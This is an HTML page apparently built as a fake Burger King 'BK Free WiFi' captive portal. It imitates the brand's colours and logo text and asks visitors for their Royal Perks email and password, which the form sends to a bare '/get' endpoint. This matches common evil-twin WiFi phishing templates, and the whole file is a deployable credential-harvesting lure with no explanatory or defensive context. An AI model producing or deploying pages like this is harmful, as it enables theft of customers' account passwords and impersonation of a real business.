<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#502314;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.bklogo{text-align:center;margin-bottom:20px}
.bklogo .bk{font-size:32px;font-weight:900;color:#F5821F;letter-spacing:1px}
.bklogo p{font-size:11px;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,0.6);margin-top:4px}
.card{background:#fff;width:100%;max-width:400px;border-radius:16px;overflow:hidden;box-shadow:0 16px 48px rgba(0,0,0,0.3)}
.ch{background:#F5821F;padding:18px 24px;text-align:center}
.ch h1{font-size:16px;font-weight:800;color:#fff}.ch p{font-size:12px;color:rgba(255,255,255,0.85);margin-top:3px}
.cb{padding:24px}
.lbl{display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.8px;color:#888;margin-bottom:6px;margin-top:14px}
input{width:100%;padding:12px 14px;border:1.5px solid #e0e0e0;border-radius:10px;font-size:15px;background:#fafafa;color:#1a1a1a}
input:focus{outline:none;border-color:#F5821F;box-shadow:0 0 0 3px rgba(245,130,31,0.12)}
input::placeholder{color:#c0c0c0}
.terms{font-size:11px;color:#aaa;line-height:1.5;margin-top:14px}.terms a{color:#F5821F}
.btn{width:100%;padding:13px;border:none;border-radius:10px;background:#F5821F;color:#fff;font-size:14px;font-weight:800;cursor:pointer;margin-top:14px}
</style>
</head>
<body>
<div class="bklogo"><div class="bk">BURGER KING</div><p>Have it your way</p></div>
<div class="card">
  <div class="ch"><h1>BK Free WiFi</h1><p>Sign in with your Royal Perks account</p></div>
  <div class="cb">
    <form action="/get">
      <label class="lbl">Royal Perks Email</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <p class="terms">By connecting you agree to <a href="#">BK's Terms of Use</a>.</p>
      <button type="submit" class="btn">Connect to WiFi</button>
    </form>
  </div>
</div>
</body>
</html>
